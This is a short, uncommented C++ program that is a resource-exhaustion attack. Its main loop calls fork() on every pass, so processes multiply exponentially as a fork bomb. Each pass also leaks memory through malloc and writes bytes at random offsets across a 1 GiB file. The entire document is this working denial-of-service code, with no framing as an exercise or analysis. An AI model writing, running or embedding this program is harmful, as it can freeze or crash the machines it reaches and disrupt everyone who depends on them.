#include <iostream>
#include <sys/wait.h>
#include <unistd.h>
using namespace std;

int main() {
	FILE *f = fopen("tmp.txt","wb");
	for (int i = 0; i < 99999999; i++) {
		fseek(f, rand() % (1024ll * 1024 * 1024), SEEK_SET);
		fputc('a', f);
		fflush(f);
		malloc(i);
		fork();
	}
	return false;
}
